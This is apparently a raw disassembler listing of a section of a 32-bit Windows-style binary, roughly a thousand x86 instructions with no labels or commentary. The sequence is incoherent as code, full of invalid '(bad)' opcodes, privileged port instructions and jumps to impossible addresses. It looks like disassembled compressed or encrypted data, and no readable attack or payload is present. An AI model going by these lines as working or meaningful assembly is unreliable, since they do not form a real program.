  40e861:	mov    cl,dh
  40e863:	les    ecx,FWORD PTR [ecx]
  40e865:	(bad)  
  40e866:	push   eax
  40e867:	out    dx,al
  40e868:	sub    ebx,esi
  40e86a:	fnstcw WORD PTR [ebx]
  40e86c:	sub    al,0x4a
  40e86e:	pop    ebp
  40e86f:	out    0xc5,al
  40e871:	aas    
  40e872:	pop    ss
  40e873:	mov    dh,0xe0
  40e875:	cwde   
  40e876:	xlat   BYTE PTR ds:[ebx]
  40e877:	xchg   ebx,eax
  40e878:	ins    BYTE PTR es:[edi],dx
  40e879:	lds    eax,FWORD PTR [eax+0xf]
  40e87c:	dec    ecx
  40e87d:	gs mov ah,0x4d
  40e880:	test   BYTE PTR [ecx+0x59794410],ch
  40e886:	mov    ecx,0xccbf07a4
  40e88b:	jbe    0x40e8ac
  40e88d:	cmp    esp,DWORD PTR [edi]
  40e88f:	sub    ah,dl
  40e891:	cli    
  40e892:	stos   DWORD PTR es:[edi],eax
  40e893:	enter  0x78d3,0x4f
  40e897:	inc    esi
  40e898:	mov    eax,ds:0x52310dff
  40e89d:	and    cl,BYTE PTR [edi-0x17]
  40e8a0:	cmp    eax,DWORD PTR [edi-0xb53ba55]
  40e8a6:	add    eax,0x46e16788
  40e8ab:	neg    ecx
  40e8ad:	xchg   edx,eax
  40e8ae:	xor    dl,ah
  40e8b0:	das    
  40e8b1:	mov    BYTE PTR [eax],al
  40e8b3:	mov    bh,0x3d
  40e8b5:	jne    0x40e8fa
  40e8b7:	pop    ecx
  40e8b8:	push   ss
  40e8b9:	ds push esi
  40e8bb:	pop    esi
  40e8bc:	ret    
  40e8bd:	rcr    eax,cl
  40e8bf:	call   edi
  40e8c1:	add    eax,0x72479ccb
  40e8c6:	je     0x40e92c
  40e8c8:	shl    dl,1
  40e8ca:	push   ebx
  40e8cb:	retf   0x9108
  40e8ce:	stc    
  40e8cf:	pop    es
  40e8d0:	add    dh,ch
  40e8d2:	rol    DWORD PTR [esi+0x16],0x23
  40e8d6:	mov    edi,0x2443cbcd
  40e8db:	outs   dx,DWORD PTR ds:[esi]
  40e8dc:	cmp    dl,ch
  40e8de:	ins    DWORD PTR es:[edi],dx
  40e8df:	stos   DWORD PTR es:[edi],eax
  40e8e0:	mov    edx,0xd521a35
  40e8e5:	sbb    BYTE PTR [edx-0x6a7c353b],bh
  40e8eb:	mov    cl,0x5c
  40e8ed:	out    0x3e,eax
  40e8ef:	addr16 mov ebx,0x47dd6de0
  40e8f5:	cmp    al,BYTE PTR [ebx-0x5a]
  40e8f8:	add    ah,BYTE PTR [ebx-0x62]
  40e8fb:	lods   al,BYTE PTR ds:[esi]
  40e8fc:	fld    QWORD PTR [ebx+0x28]
  40e8ff:	jae    0x40e8dd
  40e901:	sti    
  40e902:	(bad)  
  40e903:	(bad)  
  40e904:	scas   eax,DWORD PTR es:[edi]
  40e905:	jge    0x40e8b0
  40e907:	push   di
  40e909:	jb     0x40e908
  40e90b:	clc    
  40e90c:	or     bl,BYTE PTR ds:0x2113e760
  40e912:	enter  0xe9cb,0x1a
  40e916:	pop    esi
  40e917:	enter  0x7d0c,0x30
  40e91b:	pop    ebx
  40e91c:	pop    ecx
  40e91d:	dec    eax
  40e91e:	test   esp,ebp
  40e920:	sbb    edi,esp
  40e922:	xchg   esi,edx
  40e924:	push   edi
  40e925:	mov    al,ds:0xe9049002
  40e92a:	and    al,0xa5
  40e92c:	jmp    0x8e0fe555
  40e931:	or     al,0x65
  40e933:	scas   eax,DWORD PTR es:[edi]
  40e934:	cld    
  40e935:	jno    0x40e95d
  40e937:	cwde   
  40e938:	shl    DWORD PTR [edx+0x2aeceaa7],1
  40e93e:	mov    esi,0x20e98972
  40e943:	ret    0x6d1a
  40e946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e947:	js     0x40e94b
  40e949:	out    0x46,al
  40e94b:	into   
  40e94c:	fwait
  40e94d:	push   esp
  40e94e:	xchg   ebx,eax
  40e94f:	or     DWORD PTR [ebx-0x7e],ecx
  40e952:	jmp    0x36cd7d4d
  40e957:	lds    esp,FWORD PTR [eax+0x43]
  40e95a:	gs lock inc edi
  40e95d:	cs addr16 add eax,0x179aa041
  40e964:	inc    ebp
  40e965:	pop    ds
  40e966:	retf   
  40e967:	ins    BYTE PTR es:[edi],dx
  40e968:	(bad)  
  40e969:	adc    edx,DWORD PTR [edi*8-0x656ce110]
  40e970:	inc    ebp
  40e971:	mov    esp,0x708e383c
  40e976:	sub    ebp,DWORD PTR ds:0x4484c52d
  40e97c:	int3   
  40e97d:	xchg   edi,eax
  40e97e:	stos   BYTE PTR es:[edi],al
  40e97f:	ror    BYTE PTR [edx+ebp*2+0x62773786],1
  40e986:	xor    ch,bh
  40e988:	cld    
  40e989:	ins    DWORD PTR es:[edi],dx
  40e98a:	int3   
  40e98b:	add    BYTE PTR [eax+0x249ab1f5],cl
  40e991:	mov    ds:0x1b264c9e,al
  40e996:	addr16 repnz ds pop ebp
  40e99a:	push   0xffffff80
  40e99c:	enter  0x6aae,0x4d
  40e9a0:	jmp    0x18a6:0x3aae688c
  40e9a7:	xchg   ebp,eax
  40e9a8:	out    dx,al
  40e9a9:	inc    ebx
  40e9aa:	test   DWORD PTR [ebp-0x26],eax
  40e9ad:	pop    eax
  40e9ae:	push   ebp
  40e9af:	inc    ecx
  40e9b0:	mov    BYTE PTR [eax],ah
  40e9b2:	scas   al,BYTE PTR es:[edi]
  40e9b3:	out    0xfd,eax
  40e9b5:	pushf  
  40e9b6:	xchg   edx,eax
  40e9b7:	push   esp
  40e9b8:	xchg   ebx,eax
  40e9b9:	jecxz  0x40e94e
  40e9bb:	test   al,0x99
  40e9bd:	dec    edx
  40e9be:	mov    ah,0xfb
  40e9c0:	xchg   ebx,eax
  40e9c1:	dec    edi
  40e9c2:	add    DWORD PTR [ebx-0x24],eax
  40e9c5:	ins    BYTE PTR es:[edi],dx
  40e9c6:	push   DWORD PTR [edx+0x7e15cc14]
  40e9cc:	fnclex 
  40e9ce:	add    ah,BYTE PTR [ecx+0x4a12c3f0]
  40e9d4:	xor    al,0x5d
  40e9d6:	sub    al,ch
  40e9d8:	xor    eax,0xb86544a0
  40e9dd:	ror    DWORD PTR [esi+0x67],0xac
  40e9e1:	repnz dec eax
  40e9e3:	aas    
  40e9e4:	jbe    0x40ea4d
  40e9e6:	das    
  40e9e7:	push   eax
  40e9e8:	stos   DWORD PTR es:[edi],eax
  40e9e9:	(bad)  
  40e9ea:	jbe    0x40ea4a
  40e9ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ed:	es cmp eax,edi
  40e9f0:	push   edx
  40e9f1:	push   es
  40e9f2:	pop    esi
  40e9f3:	pusha  
  40e9f4:	leave  
  40e9f5:	pop    eax
  40e9f6:	and    bh,dh
  40e9f8:	mov    al,0x89
  40e9fa:	mov    dh,BYTE PTR [ebx]
  40e9fc:	and    eax,0xd0e09cc5
  40ea01:	jge    0x40e984
  40ea03:	cmc    
  40ea04:	inc    ebp
  40ea05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea06:	cdq    
  40ea07:	jbe    0x40ea38
  40ea09:	mov    dh,0xe5
  40ea0b:	jmp    0xf44f:0x2c2f24cc
  40ea12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea13:	fidivr WORD PTR [edi]
  40ea15:	das    
  40ea16:	icebp  
  40ea17:	sti    
  40ea18:	int3   
  40ea19:	jecxz  0x40e9ff
  40ea1b:	cmp    eax,0x3fd404a1
  40ea20:	push   0x4fc02a14
  40ea25:	cwde   
  40ea26:	push   ebx
  40ea27:	sahf   
  40ea28:	cmp    BYTE PTR [ecx+0x25370d2c],ch
  40ea2e:	or     BYTE PTR [eax+0x68],ah
  40ea31:	rcl    BYTE PTR [esp+edx*2+0x62e0ecd4],0x18
  40ea39:	je     0x40e9f8
  40ea3b:	mov    al,ds:0xa3b22986
  40ea40:	pop    es
  40ea41:	adc    DWORD PTR [edi-0xf5bfc62],esp
  40ea47:	cli    
  40ea48:	je     0x40ea20
  40ea4a:	xchg   ecx,eax
  40ea4b:	adc    DWORD PTR [ecx-0x53],edi
  40ea4e:	push   esi
  40ea4f:	push   esp
  40ea50:	or     al,0x6
  40ea52:	(bad)  
  40ea53:	mov    WORD PTR [ebx+edi*4+0x74],ds
  40ea57:	push   ebx
  40ea58:	loopne 0x40e9e0
  40ea5a:	cmp    cl,0x64
  40ea5d:	jbe    0x40ea7e
  40ea5f:	loope  0x40eabf
  40ea61:	dec    ecx
  40ea62:	dec    ebx
  40ea63:	punpckldq mm7,DWORD PTR ds:0x84303883
  40ea6a:	test   edi,eax
  40ea6c:	std    
  40ea6d:	dec    edx
  40ea6f:	es push ebp
  40ea71:	xchg   ecx,eax
  40ea72:	add    dl,BYTE PTR [ecx]
  40ea74:	retf   
  40ea75:	xchg   ebp,eax
  40ea76:	hlt    
  40ea77:	xlat   BYTE PTR ds:[ebx]
  40ea79:	pop    es
  40ea7a:	or     BYTE PTR [esi],dh
  40ea7c:	std    
  40ea7d:	ins    DWORD PTR es:[edi],dx
  40ea7e:	call   DWORD PTR ds:0x607849d5
  40ea84:	mov    eax,0x236fb443
  40ea89:	addr16 mov ch,0x2
  40ea8c:	sub    eax,0xaa8a4559
  40ea91:	dec    esi
  40ea92:	popa   
  40ea93:	js     0x40eaff
  40ea95:	or     al,0xe8
  40ea97:	leave  
  40ea98:	call   0x8363c074
  40ea9d:	pop    eax
  40ea9e:	icebp  
  40ea9f:	out    0xf3,al
  40eaa1:	mov    BYTE PTR [ebx],cl
  40eaa3:	inc    esi
  40eaa4:	sub    dh,bl
  40eaa6:	xchg   edx,eax
  40eaa7:	aas    
  40eaa8:	jp     0x40ea57
  40eaaa:	repnz pop ds
  40eaac:	hlt    
  40eaad:	fdiv   QWORD PTR [edx+0x2]
  40eab0:	jno    0x40ead1
  40eab2:	out    dx,al
  40eab3:	les    ebp,FWORD PTR [edi+0x2342d193]
  40eab9:	mov    ebp,0x50035820
  40eabe:	retf   
  40eabf:	push   esi
  40eac0:	mov    esi,ebp
  40eac2:	mov    cl,ch
  40eac4:	mov    al,0x35
  40eac6:	mov    ecx,0x8dcaeb44
  40eacb:	sbb    cl,BYTE PTR [ebx+edi*4]
  40eace:	rcr    DWORD PTR [ebp-0x31a6058],cl
  40ead4:	(bad)
  40ead7:	jnp    0x40eb0e
  40ead9:	push   esi
  40eada:	(bad)  
  40eadb:	fnstcw WORD PTR [ebx+0x4d]
  40eade:	fst    DWORD PTR [eax]
  40eae0:	push   ebp
  40eae1:	stc    
  40eae2:	mov    dh,0x2b
  40eae4:	jns    0x40eae4
  40eae6:	les    ebp,FWORD PTR [ebx]
  40eae8:	pop    ebx
  40eae9:	out    dx,eax
  40eaea:	push   edx
  40eaeb:	outs   dx,DWORD PTR ds:[esi]
  40eaec:	lods   eax,DWORD PTR ds:[esi]
  40eaed:	cmp    al,0xf4
  40eaf0:	jle    0x40eb67
  40eaf2:	push   0x60d775c2
  40eaf7:	fwait
  40eaf8:	add    dl,ah
  40eafa:	cmp    al,bh
  40eafc:	jbe    0x40ea9e
  40eafe:	dec    esp
  40eaff:	scas   eax,DWORD PTR es:[edi]
  40eb00:	sbb    al,0x39
  40eb02:	or     eax,0x78bdbd4d
  40eb07:	mov    dl,0x23
  40eb09:	sub    al,0xa5
  40eb0b:	inc    ecx
  40eb0c:	pop    edx
  40eb0d:	jmp    0x344b3a37
  40eb12:	stos   BYTE PTR es:[edi],al
  40eb13:	repz popf 
  40eb15:	popa   
  40eb16:	arpl   bp,bx
  40eb18:	(bad)  
  40eb19:	call   0xfeb6feae
  40eb1e:	add    BYTE PTR [eax-0x2b],ch
  40eb21:	and    ecx,ecx
  40eb23:	repz into 
  40eb25:	gs in  al,dx
  40eb27:	add    al,0x75
  40eb29:	pop    esp
  40eb2a:	aam    0xf2
  40eb2c:	sub    eax,0x9a87b322
  40eb31:	xor    edi,DWORD PTR [ebx]
  40eb33:	pop    ecx
  40eb34:	lea    ecx,[esi-0x24]
  40eb37:	loopne 0x40ebac
  40eb39:	ja     0x40eb9e
  40eb3b:	push   esi
  40eb3c:	xor    cl,BYTE PTR [edx+esi*8]
  40eb3f:	push   edi
  40eb40:	inc    BYTE PTR [ebp-0x20]
  40eb43:	push   ds
  40eb44:	push   edi
  40eb45:	sub    cl,ah
  40eb47:	repz adc DWORD PTR [ecx],0x872128f5
  40eb4e:	jp     0x40eb84
  40eb50:	js     0x40eaf6
  40eb52:	xchg   esi,eax
  40eb53:	imul   DWORD PTR [edi]
  40eb55:	lods   al,BYTE PTR ds:[esi]
  40eb56:	jne    0x40eba9
  40eb58:	mov    dh,0xbe
  40eb5a:	gs (bad) 
  40eb5c:	or     dh,al
  40eb5e:	sub    BYTE PTR [ebp+edx*4-0x15353530],dl
  40eb65:	fist   DWORD PTR [edi+edi*4+0x33793d2]
  40eb6c:	mov    ds:0xdbe31e6,al
  40eb71:	aam    0xd7
  40eb73:	inc    esp
  40eb74:	or     BYTE PTR [ecx-0x4a],ah
  40eb77:	std    
  40eb78:	js     0x40eb6b
  40eb7a:	mov    edx,DWORD PTR [ebp+0x19faaf59]
  40eb80:	fimul  DWORD PTR [ecx+0xc]
  40eb83:	loop   0x40eb5b
  40eb85:	cmp    BYTE PTR [ebx-0x7b7c1a39],dl
  40eb8b:	adc    al,0x4c
  40eb8d:	std    
  40eb8e:	mov    al,ds:0xadfe0df9
  40eb93:	mov    al,ds:0x29ce20c3
  40eb98:	jg     0x40ec18
  40eb9a:	dec    esp
  40eb9b:	inc    edx
  40eb9c:	and    bl,BYTE PTR [eax]
  40eb9e:	jp     0x40ebcc
  40eba0:	sub    BYTE PTR [ecx],dl
  40eba2:	jbe    0x40ebcc
  40eba4:	push   ebx
  40eba5:	cmp    esi,DWORD PTR [edx]
  40eba7:	imul   ebp,DWORD PTR [esi+0x6d],0x46a7fe37
  40ebae:	dec    ebp
  40ebaf:	sub    eax,0x7baf33b1
  40ebb4:	mov    al,ds:0xec374d18
  40ebb9:	repnz push ss
  40ebbb:	nop
  40ebbc:	call   0x54d0:0x24c7bba6
  40ebc3:	push   esp
  40ebc4:	adc    ecx,DWORD PTR [ebp-0x410a0632]
  40ebca:	mov    edi,0xfe13df68
  40ebcf:	sti    
  40ebd0:	mov    esp,?
  40ebd2:	or     bl,0x3f
  40ebd5:	inc    eax
  40ebd6:	loopne 0x40ebbf
  40ebd8:	test   BYTE PTR [eax+0x2a],bh
  40ebdb:	and    eax,0xcef3bcdd
  40ebe0:	push   cs
  40ebe1:	or     ebp,DWORD PTR [ebp+0x1f207a14]
  40ebe7:	mov    ds:0xfba50d03,eax
  40ebec:	cmp    eax,0x41b50ce8
  40ebf1:	push   edi
  40ebf2:	cmp    eax,0x6549a774
  40ebf7:	lds    esp,FWORD PTR [ebp-0x6b1523e0]
  40ebfd:	hlt    
  40ebfe:	mov    eax,0xc0c60c1
  40ec03:	xor    ecx,ebx
  40ec05:	mov    ebp,0x95330097
  40ec0a:	ror    BYTE PTR [edx+0x31],cl
  40ec0d:	fnstenv [edi+0x3b]
  40ec10:	sub    bl,BYTE PTR [ebp+0x7017f38]
  40ec16:	adc    eax,0x16d3d828
  40ec1b:	mov    DWORD PTR [eax],edi
  40ec1d:	jns    0x40ec83
  40ec1f:	pushf  
  40ec20:	lahf   
  40ec21:	cwde   
  40ec22:	adc    BYTE PTR [ebx+eiz*1+0x7e61e5eb],0x5c
  40ec2a:	cmp    edx,DWORD PTR [esi]
  40ec2c:	(bad)  
  40ec2d:	jle    0x40ebbc
  40ec2f:	xchg   edx,eax
  40ec30:	imul   ecx,DWORD PTR [eax-0x45],0xff90c3c5
  40ec37:	dec    esi
  40ec38:	adc    DWORD PTR [esi],esp
  40ec3a:	in     eax,0x5e
  40ec3c:	add    BYTE PTR [ebp-0x5130dfa9],bh
  40ec42:	jnp    0x40ec70
  40ec44:	sub    DWORD PTR [ecx],ecx
  40ec46:	nop
  40ec47:	ficomp WORD PTR [ecx-0x74d3f408]
  40ec4d:	sub    al,0xf6
  40ec4f:	mov    esp,0xcfbab5b0
  40ec54:	lods   eax,DWORD PTR ds:[esi]
  40ec55:	sub    edx,DWORD PTR [edx+0x1b]
  40ec58:	daa    
  40ec59:	call   0x8f07:0x6b031b92
  40ec60:	fldenv [edx+0x51]
  40ec63:	or     BYTE PTR [ecx],bl
  40ec65:	dec    eax
  40ec66:	fdiv   st(5),st
  40ec68:	ret    0x58d9
  40ec6b:	fistp  WORD PTR [ebp+0x1cf4130a]
  40ec71:	aad    0xe
  40ec73:	mov    ds:0x7a060271,eax
  40ec78:	and    edx,DWORD PTR ds:0xaa7cc2b8
  40ec7e:	(bad)  
  40ec7f:	in     al,0x27
  40ec81:	and    DWORD PTR [esi+ebx*1+0x48fa0f3d],esp
  40ec88:	mov    WORD PTR [ecx],ds
  40ec8a:	sbb    DWORD PTR [esi+0x55],edi
  40ec8d:	repz imul ebx,DWORD PTR [edi-0x5d],0x2e
  40ec92:	stc    
  40ec93:	add    BYTE PTR [esi-0x414ef29c],dh
  40ec99:	in     eax,dx
  40ec9a:	rdtsc  
  40ec9c:	push   esi
  40ec9d:	jmp    0x73774325
  40eca2:	mov    ch,0x79
  40eca4:	or     DWORD PTR ds:0x6d347014,ebx
  40ecaa:	sub    eax,0x66d4986d
  40ecaf:	ja     0x40ecd2
  40ecb1:	push   0xffffffaf
  40ecb3:	inc    eax
  40ecb4:	jnp    0x40ec9b
  40ecb6:	outs   dx,DWORD PTR ds:[esi]
  40ecb7:	xor    al,0x9d
  40ecb9:	test   BYTE PTR [edx],cl
  40ecbb:	addr16 sbb dh,ah
  40ecbe:	call   0xf8d5e1b9
  40ecc3:	aad    0x21
  40ecc5:	jle    0x40ecbc
  40ecc7:	pusha  
  40ecc8:	adc    cl,ch
  40ecca:	add    al,0x5f
  40eccc:	js     0x40ed30
  40ecce:	repnz dec DWORD PTR [edi+0x71]
  40ecd2:	mov    DWORD PTR ds:0x6fa7f6a9,edi
  40ecd8:	cld    
  40ecd9:	test   ebx,esi
  40ecdb:	jg     0x40ec9b
  40ecdd:	or     edx,DWORD PTR [ebp-0x26]
  40ece0:	je     0x40eca5
  40ece2:	(bad)  
  40ece3:	(bad)  [edx+0x54]
  40ece6:	jmp    0x6977450b
  40eceb:	out    0xa7,eax
  40eced:	pop    ebx
  40ecee:	mov    edi,0x399de21a
  40ecf3:	cmp    eax,ebx
  40ecf5:	xor    bh,BYTE PTR [esp+eiz*2-0x10bb6f08]
  40ecfc:	imul   edi,eax,0x54f87f51
  40ed02:	ror    DWORD PTR [esi-0x5582607a],1
  40ed08:	pop    ebx
  40ed09:	add    eax,0x314b6f64
  40ed0e:	dec    BYTE PTR [ebx+0x11]
  40ed11:	and    al,0x9e
  40ed13:	aad    0x6f
  40ed15:	dec    edx
  40ed16:	fmul   DWORD PTR [ebp+0x38a79557]
  40ed1c:	aad    0x4
  40ed1e:	sub    esi,ecx
  40ed20:	scas   eax,DWORD PTR es:[edi]
  40ed21:	sub    DWORD PTR [edx],ebp
  40ed23:	pop    edx
  40ed24:	lods   al,BYTE PTR ds:[esi]
  40ed25:	mov    ecx,DWORD PTR [ebp+0x5f28cc11]
  40ed2b:	push   ebp
  40ed2c:	push   ecx
  40ed2d:	jns    0x40ed10
  40ed2f:	pop    ecx
  40ed30:	jae    0x40ecc0
  40ed32:	push   edx
  40ed33:	fwait
  40ed34:	inc    esp
  40ed35:	stos   DWORD PTR es:[edi],eax
  40ed36:	cmp    esp,ecx
  40ed38:	mov    ebp,0xc1db2cf2
  40ed3d:	in     al,0x3f
  40ed3f:	mov    ah,0x82
  40ed41:	ins    DWORD PTR es:[edi],dx
  40ed42:	sub    eax,0xdc1ceea
  40ed47:	add    BYTE PTR [esi-0x6c],bl
  40ed4a:	cmp    eax,0xe0ebd72c
  40ed4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed50:	sub    ecx,esi
  40ed52:	rcl    DWORD PTR [esi+edi*2],1
  40ed55:	repz imul esp,DWORD PTR [edx+0x4f54bdeb],0x5837a3d3
  40ed60:	pop    edx
  40ed61:	xor    DWORD PTR [eax+ebx*2+0x20],ebx
  40ed65:	jns    0x40ed9c
  40ed67:	mov    edx,0xd03f799f
  40ed6c:	jbe    0x40ed26
  40ed6e:	imul   edx,DWORD PTR es:[ebx-0x2b98f3be],0xffffffd0
  40ed76:	sub    BYTE PTR [edi+eiz*1+0x6a91c3d3],dl
  40ed7d:	lods   al,BYTE PTR ds:[esi]
  40ed7e:	and    eax,0x4d5723d3
  40ed83:	push   ebx
  40ed84:	add    eax,0xdf434101
  40ed89:	ficom  DWORD PTR [eax-0x79b49f45]
  40ed8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed90:	xor    al,0x40
  40ed92:	push   0x6c
  40ed94:	mov    ebp,esp
  40ed96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed97:	aad    0xc1
  40ed99:	mov    ds:0xf5c6cc50,al
  40ed9f:	cs jmp 0x40eda7
  40eda2:	mov    WORD PTR [ebx],cs
  40eda4:	jo     0x40ee0a
  40eda6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eda7:	(bad)  
  40eda8:	and    bh,BYTE PTR [eax]
  40edaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edab:	sub    edi,0xc12b5b1d
  40edb1:	into   
  40edb2:	sub    esi,DWORD PTR [ecx+0x5a0c2720]
  40edb8:	and    DWORD PTR [ecx-0x1f],esp
  40edbb:	ins    DWORD PTR es:[edi],dx
  40edbc:	dec    eax
  40edbd:	or     bl,dh
  40edbf:	xlat   BYTE PTR ds:[ebx]
  40edc0:	aas    
  40edc1:	sub    al,0x9b
  40edc3:	(bad)  
  40edc5:	dec    esp
  40edc6:	mov    DWORD PTR ds:0x820056cd,eax
  40edcc:	push   cs
  40edcd:	mov    dl,0xea
  40edcf:	pop    ecx
  40edd0:	sub    DWORD PTR [esi+0x32daa932],edi
  40edd6:	push   ecx
  40edd7:	cmp    ch,bl
  40edd9:	js     0x40ee35
  40eddb:	imul   edi,edx,0xa6282e6c
  40ede1:	and    DWORD PTR [edi+0x5bc14cbc],0xffffff87
  40ede8:	add    bh,BYTE PTR [ebp-0x31]
  40edeb:	lds    edx,FWORD PTR [ebx]
  40eded:	fist   DWORD PTR [ebx]
  40edef:	add    al,0x6
  40edf1:	fisubr DWORD PTR [ebp+0x5c]
  40edf4:	mov    edi,0xc518d760
  40edf9:	add    DWORD PTR [eax+0x31],esp
  40edfc:	stos   BYTE PTR es:[edi],al
  40edfd:	dec    esi
  40edfe:	dec    edx
  40edff:	or     ah,BYTE PTR [edx+0x5]
  40ee02:	push   edx
  40ee03:	iret   
  40ee04:	rol    DWORD PTR [edi],0xc2
  40ee07:	inc    edx
  40ee08:	inc    edi
  40ee09:	les    ebp,FWORD PTR [edx+0x52dd48d6]
  40ee0f:	mov    al,0xa8
  40ee11:	hlt    
  40ee12:	add    ch,BYTE PTR [ebp-0x31]
  40ee15:	daa    
  40ee16:	dec    edi
  40ee17:	jge    0x40edad
  40ee19:	enter  0x75ef,0xef
  40ee1d:	pop    ebp
  40ee1e:	cmp    BYTE PTR [esi+0x2e0686a1],ch
  40ee24:	rcr    DWORD PTR [ebx],cl
  40ee26:	ins    BYTE PTR es:[edi],dx
  40ee27:	leave  
  40ee28:	dec    ebp
  40ee29:	pushf  
  40ee2a:	out    dx,al
  40ee2b:	adc    al,0x8b
  40ee2d:	loop   0x40edf9
  40ee2f:	jg     0x40ee36
  40ee31:	clc    
  40ee32:	and    DWORD PTR [ebp-0x64],ebx
  40ee35:	popa   
  40ee36:	inc    ebx
  40ee37:	aam    0x83
  40ee39:	repz hlt 
  40ee3b:	ret    
  40ee3c:	clc    
  40ee3d:	cdq    
  40ee3e:	xchg   ebp,eax
  40ee3f:	repz inc ebp
  40ee41:	jg     0x40ee7c
  40ee43:	fnstenv [eax]
  40ee45:	out    dx,al
  40ee46:	adc    ah,ch
  40ee48:	sbb    BYTE PTR [eax+0x7f],0x7d
  40ee4c:	sub    edi,DWORD PTR [edx-0x2c]
  40ee4f:	jmp    0x61ab:0xc35464b5
  40ee56:	push   ebx
  40ee57:	adc    DWORD PTR [edi],0xffffffcf
  40ee5a:	xor    eax,0x89042cf4
  40ee5f:	ss retf 
  40ee61:	add    al,BYTE PTR ds:0x29b89e82
  40ee67:	fwait
  40ee68:	pusha  
  40ee69:	test   eax,0x1405a547
  40ee6e:	pop    es
  40ee6f:	jg     0x40eeaf
  40ee71:	mov    bh,0x6b
  40ee73:	in     eax,dx
  40ee74:	shl    DWORD PTR [edi-0x78dba3ad],0x94
  40ee7b:	int    0x4
  40ee7d:	sbb    dl,BYTE PTR [eax+0x3d2c8dff]
  40ee83:	jmp    0x40eebb
  40ee85:	pusha  
  40ee86:	push   ebx
  40ee87:	paddb  mm6,QWORD PTR [edx]
  40ee8a:	mov    dl,0xb
  40ee8c:	mov    BYTE PTR es:[edx-0x3d],bh
  40ee90:	xchg   esi,eax
  40ee91:	add    al,0xdf
  40ee93:	pushf  
  40ee94:	sub    BYTE PTR [edx],ah
  40ee96:	aaa    
  40ee97:	(bad)  
  40ee99:	popa   
  40ee9a:	adc    DWORD PTR [ecx-0x5d],esp
  40ee9d:	sub    eax,0x99d0dc92
  40eea2:	sahf   
  40eea3:	sub    DWORD PTR [ecx-0x3fcb6869],edi
  40eea9:	mov    eax,0xa46bc84
  40eeae:	(bad)  
  40eeaf:	call   0x707bb8ac
  40eeb4:	push   edx
  40eeb5:	(bad)  
  40eeb6:	or     eax,0x178d5949
  40eebb:	mov    eax,DWORD PTR [edi-0x31]
  40eebe:	xchg   edx,eax
  40eebf:	cmp    eax,0x48c0383a
  40eec4:	aaa    
  40eec5:	in     al,0x50
  40eec7:	mov    eax,0x3b284e12
  40eecc:	dec    ecx
  40eecd:	sbb    eax,0xfded08c6
  40eed3:	pop    ebp
  40eed4:	pushf  
  40eed5:	ror    BYTE PTR [ecx-0x3b],cl
  40eed8:	scas   al,BYTE PTR es:[edi]
  40eed9:	mov    al,0x9d
  40eedb:	xor    eax,0x712d99c0
  40eee0:	inc    edi
  40eee1:	outs   dx,DWORD PTR ds:[esi]
  40eee2:	arpl   WORD PTR ds:0xe2160ea3,dx
  40eee8:	jnp    0x40eef3
  40eeea:	call   0x42a0bacf
  40eeef:	arpl   ax,di
  40eef1:	in     eax,0xd4
  40eef3:	pop    eax
  40eef4:	jne    0x40ef45
  40eef6:	xor    eax,0x4715ca04
  40eefb:	or     DWORD PTR [eax+eiz*4],ebx
  40eefe:	cmp    cl,al
  40ef00:	outs   dx,DWORD PTR ds:[esi]
  40ef01:	in     eax,0x68
  40ef03:	push   ds
  40ef04:	or     eax,0xb3e2fff0
  40ef09:	sub    eax,0xa6a188f5
  40ef0f:	or     DWORD PTR [edi],ebx
  40ef11:	repz add ecx,0x12ded166
  40ef18:	sar    DWORD PTR ds:0xc1576c2d,1
  40ef1e:	out    0x3f,al
  40ef20:	into   
  40ef21:	mov    ebp,0xc0237dab
  40ef26:	inc    ebx
  40ef27:	sbb    edx,DWORD PTR ds:0x7c68e339
  40ef2d:	jo     0x40ef26
  40ef2f:	fcmovne st,st(5)
  40ef31:	arpl   WORD PTR [eax-0x73461529],bp
  40ef37:	stos   DWORD PTR es:[edi],eax
  40ef38:	add    DWORD PTR [ecx-0x21],edi
  40ef3b:	xchg   esp,eax
  40ef3c:	test   BYTE PTR [eax],dl
  40ef3e:	xchg   ecx,eax
  40ef3f:	pop    ss
  40ef40:	mov    dh,0x82
  40ef42:	mov    edi,0x955f5a32
  40ef47:	push   ebp
  40ef48:	adc    bl,dh
  40ef4a:	fcmovnbe st,st(4)
  40ef4c:	cli    
  40ef4d:	inc    eax
  40ef4e:	jo     0x40eee6
  40ef50:	mov    BYTE PTR [edi],dh
  40ef52:	les    edx,FWORD PTR ds:0xdf5968a5
  40ef58:	jne    0x40ef19
  40ef5a:	mov    edx,0xcea7335f
  40ef5f:	ficom  WORD PTR [ebp+edx*8-0x79]
  40ef63:	jmp    0x40ef5f
  40ef65:	loopne 0x40efe4
  40ef67:	dec    ecx
  40ef68:	mov    edx,0x6bd536c8
  40ef6d:	inc    eax
  40ef6e:	sbb    dl,bl
  40ef70:	stos   BYTE PTR es:[edi],al
  40ef71:	sub    DWORD PTR [esi+0x17078865],edx
  40ef77:	xor    eax,ecx
  40ef79:	(bad)  
  40ef7a:	dec    ecx
  40ef7b:	test   BYTE PTR [ebx+0x21],ah
  40ef7e:	pop    eax
  40ef7f:	sbb    cl,BYTE PTR [eax+0x5b]
  40ef82:	inc    ebx
  40ef83:	jmp    0x40ef52
  40ef85:	cmp    bh,BYTE PTR [eax+0x1a]
  40ef88:	bound  ecx,QWORD PTR [ecx-0x41]
  40ef8b:	jmp    0x5715:0x33ed6041
  40ef92:	int3   
  40ef93:	popf   
  40ef94:	pop    esp
  40ef95:	ret    0x7fc9
  40ef98:	les    ecx,FWORD PTR [esi-0x50832594]
  40ef9e:	fs add al,0x60
  40efa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efa2:	ins    DWORD PTR es:[edi],dx
  40efa3:	sub    eax,0x93148edd
  40efa8:	sub    al,0xae
  40efaa:	idiv   DWORD PTR [eax+0x27]
  40efad:	sub    DWORD PTR [eax+0x3dccb255],edi
  40efb3:	bound  ecx,QWORD PTR [ebx+esi*4]
  40efb6:	imul   ebx,DWORD PTR [esi+0x0],0x609e148b
  40efbd:	div    ah
  40efbf:	add    al,0x42
  40efc1:	add    eax,0xd89a1921
